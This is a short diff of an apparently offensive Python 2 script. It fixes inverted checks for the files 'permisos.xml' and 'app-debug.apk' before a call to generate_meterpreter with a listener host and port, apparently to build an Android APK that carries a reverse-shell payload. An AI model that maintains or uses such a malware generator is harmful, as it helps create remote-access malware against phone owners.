@@ -173,10 +173,10 @@ try:
 	args=parser.parse_args()
 	host=args.lhost
 	port=args.lport
-	if os.path.exists("permisos.xml"):
+	if not os.path.exists("permisos.xml"):
 		print "[!] Where it's permisos.xml?"
 		exit()
-	if os.path.exists("app-debug.apk"):
+	if not os.path.exists("app-debug.apk"):
 		print "[!] Where it's app-debug.apk?"
 		exit()
 	generate_meterpreter(host,port)
